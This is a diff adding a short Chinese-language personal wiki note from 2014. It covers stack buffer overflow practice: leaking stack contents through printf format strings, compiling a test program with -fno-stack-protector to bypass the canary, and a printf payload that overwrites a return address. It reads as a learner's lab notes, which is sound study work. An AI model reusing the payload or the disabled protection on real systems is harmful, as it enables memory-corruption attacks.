@@ -1,0 +1,31 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2014-04-28T14:37:25+08:00
+
+====== 栈溢出 ======
+Created Monday 28 April 2014
+
+
+（１）
+关于栈溢出，现在我知道了，可以通过printf 打印栈上面的内容，但是只能一个一个的打啊，如果用了 %$1d 这种方法的话，应该可以打印任意位置的栈把
+
+（２）
+通过溢出栈上面的数组，来将当前函数的返回值地址修改成想要跳转的地方
+
+gcc -g -fno-stack-protector  overflow1.c  -o overflow1 
+注意!!!!
+必须要加 -fno-stack-protector　这个选项，不加的话就是这样了
+*** stack smashing detected ***: ./overflow11 terminated
+======= Backtrace: =========
+。。。。。被发现了。。。。。我要学习一下，加了这个参数是如何做检查的
+见 overlow/overflow1/ 
+[[./overflow1]] `printf "aaaaaaaaaaaaaaaaaaaaaaaa\xb4\x05\x40\x00\x00\x00\x00\x00\x00"`
+就可以攻击成功了
+
+
+
+这种方法可以打印出转义字符，不是地址中的每个字节都可以用 字母表示的
+`printf "aaaaaaaaaaaaaaaaaaaaaaaa\xb4\x05\x40\x00\x00\x00\x00\x00\x00"`
+
+
+6.3.3   用通用攻击代码
